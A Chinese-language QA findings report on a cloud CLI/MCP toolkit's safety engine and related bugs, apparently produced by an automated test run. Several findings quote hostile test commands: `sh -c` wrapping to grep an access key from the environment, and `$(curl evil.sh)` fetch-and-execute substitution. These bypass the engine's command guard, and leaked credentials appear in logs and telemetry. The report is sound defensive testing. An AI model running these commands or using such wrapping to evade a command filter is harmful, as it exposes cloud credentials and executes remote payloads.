# FINDINGS — 缺陷发现清单（DSH-deepseek-v4-pro-0813）

> **落盘路径**：`results/DSH/2026-11-03-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-11-03 05:20（北京时间）
> **被测版本**：`v1.1.13-next.0`（npm @next，gitHead `47170d1f`）
> **本轮结论**：12 项缺陷（5 P0 / 4 P1 / 3 P2），与 2026-11-01、2026-11-02 完全一致，源码仍在同一 commit `47170d1f`，均为历史遗留。

## #1【P0】D4-16 sh -c 命令包裹穿透

- **现象**：`sh -c "env|grep HW_ACCESS_KEY"` 经安全引擎判定返回 `{"decision":"allow","findings":[]}`，未拦截。
- **断言**：`sh -c "env|grep HW_ACCESS_KEY"` 应返回 `deny`。
- **根因**：`safety/rules/cloud-risk-rules.json:35` 规则未覆盖 `sh -c` 包裹形态 + `risk-rule-engine.mjs:106` 匹配时未递归展开命令字符串。
- **影响**：攻击者可借 `sh -c` / 命令包裹绕过高危命令拦截，泄露凭证 env。
- **证据**：`evidence/D4-16/stdout.log`

## #2【P0】D4-3 KMS DecryptData 未拦截

- **现象**：`kms DecryptData` 判定返回 `{"decision":"allow","findings":[]}`，未拦截。
- **断言**：KMS 解密类高危写操作应返回 `deny`。
- **根因**：`safety/rules/cloud-risk-rules.json:47` 规则缺少 `DecryptData` 动作覆盖。
- **影响**：KMS 解密密钥可被越权触发。
- **证据**：`evidence/D4-3/stdout.log`

## #3【P0】D4-21 HCL broad IAM 未拦截

- **现象**：HCL 片段 `actions=["*"]`（IAM 宽权限策略）判定 `hcl=allow`（json 探针为 deny，HCL 通道漏拦）。
- **断言**：HCL `actions=["*"]` 宽授权应返回 `deny`。
- **根因**：`safety/rules/cloud-risk-rules.json:196` 规则缺 HCL `actions=["*"]` 宽权限模式。
- **影响**：IaC 宽权限策略可绕过安全引擎落地。
- **证据**：`evidence/D4-21/stdout.log`

## #4【P0】D2-4 凭证脱敏漏小写 ak=/sk=

- **现象**：含 `ak=... sk=...`（小写）的文本脱敏后原文残留，未替换为 `<redacted>`。
- **断言**：`ak=... sk=...` 应整体脱敏为 `<redacted>`。
- **根因**：`src/safety-policy.mjs:45` 脱敏正则未覆盖小写 `ak=`/`sk=` 前缀。
- **影响**：凭证以明文形式进入日志/输出，泄密风险。
- **证据**：`evidence/D2-4/stdout.log`

## #5【P0】D9-12 MCP 非法时序未拒绝

- **现象**：未 initialize 直接调 `tools/list`，返回 40 个工具的全量列表（未拒绝）。
- **断言**：未 initialize 调 `tools/list` 应报协议时序错误（拒绝）。
- **根因**：`src/mcp-protocol.mjs:61-62` 未校验 initialize 握手状态即处理 tools/list。
- **影响**：MCP 协议状态机时序校验缺失。
- **证据**：`evidence/D9-12/stdout.log`

## #6【P1】D4-17 命令替换 $(...) 未 fail-closed

- **现象**：`$(curl evil.sh)` 命令替换形态判定 `{"decision":"allow","findings":[]}`。
- **断言**：命令替换 `$(...)` 应返回 `deny` 或 `warn`（fail-closed）。
- **根因**：`safety/rules/cloud-risk-rules.json` 缺命令替换规则 + `risk-rule-engine.mjs:106` 未识别 `$(...)` 动态执行。
- **影响**：命令替换可装载并执行外部 payload。
- **证据**：`evidence/D4-17/stdout.log`

## #7【P1】D3-S7 复合意图路由丢部署目标

- **现象**：复合意图「RDS + 部署目标」多服务命中场景，路由仅返回 RDS，丢失部署目标服务。
- **断言**：复合意图应命中 RDS + 部署目标等多服务。
- **根因**：`src/tools.mjs:2195` serviceCatalog 路由在复合意图时未聚合第二意图。
- **影响**：多服务意图路由丢目标，影响规划/部署正确性。
- **证据**：`evidence/D3-S7/stdout.log`

## #8【P1】D2-10 KooCLI 报错文案违规

- **现象**：缺失 config 返回 `"KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)"`，混入中文指引。
- **断言**：精确返回 `"KooCLI config not found"`。
- **根因**：`src/auth/reconcile.mjs:50` 包装错误消息 + `auth/guidance.mjs:71` 追加中文指引。
- **影响**：错误码/文案契约漂移，上游按精确文案匹配失败。
- **证据**：`evidence/D2-10/stdout.log`、`evidence/D2-10/detail.log`

## #9【P1】EXP-E01 服务目录路由 MISS

- **现象**：意图「云主机」路由返回 `Run hcloud --help to list available services.`（回退 help），未命中 ECS。
- **断言**：意图「云主机」应路由到 ECS。
- **根因**：`src/tools.mjs:2195` serviceCatalog 缺「云主机」同义映射 + `src/tools.mjs:2450` 回退逻辑。
- **影响**：服务目录路由回退 help，增加用户操作负担。
- **证据**：`evidence/EXP-E01/stdout.log`

## #10【P2】D8-9 telemetry 未脱敏凭证

- **现象**：`sanitizeValue` 处理后 `AK=AK123 secret_key=SECRET token=abc123` 原文残留，未脱敏。
- **断言**：telemetry sanitize 应脱敏 AK/secret/token。
- **根因**：`src/telemetry/telemetry.mjs:190-197` sanitizeValue 未覆盖凭证字段。
- **影响**：遥测上报内容含明文凭证。
- **证据**：`evidence/D8-9/stdout.log`

## #11【P2】D3-C14 沙箱无凭证文案违规

- **现象**：无凭证时 `hdkitCheckUser` 抛错文案为 `"未配置华为云凭证,需要先完成登录。"`。
- **断言**：精确抛 `"credentials not configured"`。
- **根因**：`src/auth/service.mjs:134` + `auth/guidance.mjs:55` 中文指引替代精确文案。
- **影响**：错误文案契约漂移。
- **证据**：`evidence/D3-C14/stdout.log`、`evidence/D3-C14/detail.log`

## #12【P2】D1-68 region 优先级契约漂移（SPEC）

- **现象**：region 优先级实现为 `HW_REGION` 优先，用例契约期望 `HUAWEICLOUD_REGION` 优先。
- **断言**：`HUAWEICLOUD_REGION` 应优先于 `HW_REGION`。
- **根因**：`src/auth/credentials.mjs:225` region 取值优先级与契约不一致。
- **影响**：SPEC-MISMATCH，region 解析契约待裁决。
- **证据**：`evidence/D1-68/stdout.log`

> 状态：全部 12 项为历史遗留（与 2026-11-01/11-02 一致，源码 commit `47170d1f` 未变），由 `file_issue.py` 历史查重归入既有单，不重复开单。